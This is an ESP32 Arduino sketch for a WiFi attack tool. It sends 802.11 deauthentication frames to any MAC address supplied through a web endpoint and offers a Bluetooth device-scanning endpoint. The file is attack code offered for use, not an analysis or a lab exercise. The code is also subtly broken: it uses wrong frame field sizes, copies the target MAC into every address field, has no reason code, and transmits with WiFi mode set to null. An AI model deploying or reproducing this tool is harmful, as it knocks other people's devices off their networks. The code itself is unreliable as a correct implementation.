#include <WiFi.h>
#include <esp_wifi.h>
#include <BluetoothSerial.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>

BluetoothSerial SerialBT;
AsyncWebServer server(80);

// WiFi Attack Parameters
typedef struct {
    unsigned frame_ctrl;
    unsigned duration;
    uint8_t dest[6];
    uint8_t source[6];
    uint8_t bssid[6];
    unsigned seq_ctrl;
} __attribute__((packed)) DeauthFrame;

void sendDeauth(uint8_t* mac) {
    DeauthFrame deauth;
    memset(&deauth, 0, sizeof(DeauthFrame));
    
    deauth.frame_ctrl = 0xC0;
    memcpy(deauth.dest, mac, 6);
    memcpy(deauth.source, mac, 6);
    memcpy(deauth.bssid, mac, 6);
    
    esp_wifi_80211_tx(WIFI_IF_AP, &deauth, sizeof(DeauthFrame), false);
}

// Web Server Handlers
void setupWebRoutes() {
    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
        if(request->hasParam("mac")) {
            String macStr = request->getParam("mac")->value();
            uint8_t mac[6];
            sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
            sendDeauth(mac);
            request->send(200, "text/plain", "Deauth sent to " + macStr);
        }
    });

    server.on("/blescan", HTTP_GET, [](AsyncWebServerRequest *request){
        String results = "Discovered BLE Devices:\n";
        BTScanResults *scanResults = SerialBT.getScanResults();
        for(int i=0; i<scanResults->getCount(); i++) {
            results += scanResults->getDevice(i).toString().c_str();
            results += "\n";
        }
        request->send(200, "text/plain", results);
    });
}

void setup() {
    Serial.begin(115200);
    
    // Start BLE
    SerialBT.begin("SecurityTool");
    SerialBT.startScan();
    
    // WiFi in Monitor Mode
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    
    // Web Interface
    setupWebRoutes();
    server.begin();
}

void loop() {
    // Advanced packet handling
    vTaskDelay(pdMS_TO_TICKS(100));
}
